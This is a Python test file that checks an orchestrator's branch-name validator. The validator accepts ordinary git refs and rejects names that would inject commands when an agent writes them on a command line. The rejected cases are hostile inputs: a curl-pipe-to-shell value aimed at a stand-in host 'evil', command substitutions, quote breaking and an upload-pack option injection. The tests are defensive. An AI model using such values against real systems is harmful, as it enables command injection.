"""Which branch names a conflict fix's instructions can hold."""

import pytest

from orchestrator.worker.gate_conflicts import is_plain_ref
from orchestrator.worker.rework import UnsafeRef, plain_ref


@pytest.mark.parametrize(
    "ref",
    ["spec/12-widget", "dependabot/npm_and_yarn/left-pad-1.3.0", "feature/#123_fix", "release@2"],
)
def test_an_ordinary_branch_name_can_go_into_the_fix_instructions(ref: str) -> None:
    assert is_plain_ref(ref)
    assert plain_ref(ref) == ref


@pytest.mark.parametrize(
    "ref",
    ["x;curl${IFS}evil|sh", "spec/12-`id`", "a$(id)", "it's", 'say"hi"', "-upload-pack=x", "a&b"],
)
def test_a_branch_name_a_command_line_can_act_on_cannot(ref: str) -> None:
    # Git allows each of these in a ref; the agent writes the name on a command line.
    assert not is_plain_ref(ref)
    with pytest.raises(UnsafeRef, match="remove the blocked label"):
        plain_ref(ref)
